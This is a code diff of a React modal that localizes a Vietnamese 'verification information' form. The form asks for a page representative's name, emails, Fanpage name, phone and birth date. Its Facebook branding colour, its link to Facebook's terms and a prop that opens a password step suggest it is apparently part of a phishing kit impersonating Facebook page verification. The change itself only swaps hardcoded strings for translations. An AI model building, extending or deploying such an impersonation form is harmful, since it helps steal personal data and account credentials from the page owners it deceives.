@@ -4,6 +4,7 @@ import PhoneInput from 'react-phone-input-2';
 import CustomCheckbox from '#components/check-box/CustomCheckbox';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
+import { useAppStrings } from '@/hooks/useAppStrings';
 
 interface InfomationsModalProps {
   isOpend: boolean;
@@ -12,6 +13,7 @@ interface InfomationsModalProps {
 }
 
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
+  const t = useAppStrings();
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
   const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length;
@@ -41,28 +43,28 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       e.preventDefault();
 
       const newErrors: Record<string, string> = {};
-      if (!formData.fullName.trim()) newErrors.fullName = "Vui lòng nhập họ và tên đầy đủ.";
+      if (!formData.fullName.trim()) newErrors.fullName = t.info.errFullName;
       if (!formData.email.trim()) {
-        newErrors.email = "Vui lòng nhập địa chỉ email liên hệ.";
+        newErrors.email = t.info.errEmail;
       } else if (!emailRegex.test(formData.email.trim())) {
-        newErrors.email = "Email liên hệ không đúng định dạng (ví dụ: name@domain.com).";
+        newErrors.email = t.info.errEmailFmt;
       }
       if (!formData.emailBusiness.trim()) {
-        newErrors.emailBusiness = "Vui lòng nhập email doanh nghiệp hợp lệ.";
+        newErrors.emailBusiness = t.info.errEmailBiz;
       } else if (!emailRegex.test(formData.emailBusiness.trim())) {
-        newErrors.emailBusiness = "Email doanh nghiệp không đúng định dạng (ví dụ: name@domain.com).";
+        newErrors.emailBusiness = t.info.errEmailBizFmt;
       }
-      if (!formData.fanpage.trim()) newErrors.fanpage = "Vui lòng nhập tên Trang/Fanpage.";
+      if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage;
       const phoneDigits = normalizePhoneDigits(formData.phone);
       const phoneDigitCount = getPhoneDigitCount(formData.phone);
       if (!phoneDigits) {
-        newErrors.phone = "Vui lòng nhập số điện thoại.";
+        newErrors.phone = t.info.errPhone;
       } else if (phoneDigitCount < 8 || phoneDigitCount > 15) {
-        newErrors.phone = "Số điện thoại phải có từ 8 đến 15 chữ số (không tính dấu + và khoảng trắng).";
+        newErrors.phone = t.info.errPhoneLen;
       }
-      if (!formData.day) newErrors.day = "Vui lòng chọn ngày sinh.";
-      if (!formData.month) newErrors.month = "Vui lòng chọn tháng sinh.";
-      if (!formData.year) newErrors.year = "Vui lòng chọn năm sinh.";
+      if (!formData.day) newErrors.day = t.info.errDay;
+      if (!formData.month) newErrors.month = t.info.errMonth;
+      if (!formData.year) newErrors.year = t.info.errYear;
 
       if (Object.keys(newErrors).length > 0) {
         setErrors(newErrors);
@@ -93,7 +95,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   return (
     <Modal
       isOpen={isOpen}
-      title={"Thông tin xác minh"}
+      title={t.info.title}
       onClose={handleClose}
     >
       <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
@@ -101,15 +103,15 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
           <div className='w-full'>
             <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
               <p className='text-[13px] leading-[1.55] text-[#33507f]'>
-                Vui lòng điền chính xác và đầy đủ các trường bắt buộc để hoàn tất hồ sơ xác minh.
+                {t.info.hint}
               </p>
             </div>
-            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Họ và tên người đại diện <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
                 id='fullName'
-                placeholder={"Ví dụ: Nguyễn Văn A"}
+                placeholder={t.info.fullNamePh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fullName}
                 onChange={handleChange}
@@ -117,12 +119,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fullName')}
 
-            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Email liên hệ <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('email')}>
               <input
                 type="email"
                 id='email'
-                placeholder={"Ví dụ: nguyenvana@gmail.com"}
+                placeholder={t.info.emailPh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.email}
                 onChange={handleChange}
@@ -130,12 +132,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('email')}
 
-            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Email doanh nghiệp <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.emailBiz} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('emailBusiness')}>
               <input
                 type="email"
                 id='emailBusiness'
-                placeholder={"Ví dụ: contact@tencongty.com"}
+                placeholder={t.info.emailBizPh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.emailBusiness}
                 onChange={handleChange}
@@ -143,12 +145,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('emailBusiness')}
 
-            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Tên Trang/Fanpage <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fanpage')}>
               <input
                 type="text"
                 id='fanpage'
-                placeholder={"Ví dụ: ABC Studio Official"}
+                placeholder={t.info.fanpagePh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fanpage}
                 onChange={handleChange}
@@ -156,7 +158,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
-            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Số điện thoại <span className='text-[#e5484d]'>*</span></label>
+            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
             <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <PhoneInput
                 country={formData.country_code?.toLowerCase() || "us"}
@@ -177,9 +179,9 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             {errorText('phone')}
 
             <div>
-              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>Ngày tháng năm sinh <span className='text-[#e5484d]'>*</span></b>
+              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
             </div>
-            <div className="grid grid-cols-3 gap-[10px]">
+            <div className="grid grid-cols-1 gap-[10px] sm:grid-cols-3">
               <div>
                 <div className={inputClass('day')}>
                   <select
@@ -188,7 +190,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     value={formData.day}
                     onChange={handleChange}
                   >
-                    <option value="">Ngày</option>
+                    <option value="">{t.info.day}</option>
                     {days.map((day) => (
                       <option key={day} value={day}>{day}</option>
                     ))}
@@ -205,7 +207,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     value={formData.month}
                     onChange={handleChange}
                   >
-                    <option value="">Tháng</option>
+                    <option value="">{t.info.month}</option>
                     {months.map((month) => (
                       <option key={month} value={month}>{month}</option>
                     ))}
@@ -222,7 +224,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     value={formData.year}
                     onChange={handleChange}
                   >
-                    <option value="">Năm</option>
+                    <option value="">{t.info.year}</option>
                     {years.map((year) => (
                       <option key={year} value={year}>{year}</option>
                     ))}
@@ -233,12 +235,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
             </div>
 
-            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Ghi chú bổ sung (tùy chọn)</label>
+            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.message}</label>
             <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <textarea
                 id='message'
                 className="w-full outline-0 h-full resize-none"
-                placeholder={"Ví dụ: Trang đại diện chính thức cho thương hiệu ABC, cần hoàn tất xác minh để tăng mức độ tin cậy."}
+                placeholder={t.info.messagePh}
                 value={formData.message}
                 onChange={handleChange}
               />
@@ -247,11 +249,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             <div className='mt-[15px] mb-[20px]'>
               <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                 <CustomCheckbox />
-                Tôi đồng ý với <a href='https://www.facebook.com/legal/terms' target='_blank' rel='noopener noreferrer' className='text-[#0064E0] hover:underline'>Điều khoản sử dụng <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
+                {t.info.agree} <a href='https://www.facebook.com/legal/terms' target='_blank' rel='noopener noreferrer' className='text-[#0064E0] hover:underline'>{t.info.agreeTerms} <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
               </label>
             </div>
             <div className='w-full mt-[20px] '>
-              <button className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>Gửi thông tin xác minh</button>
+              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
             </div>
           </div>
 
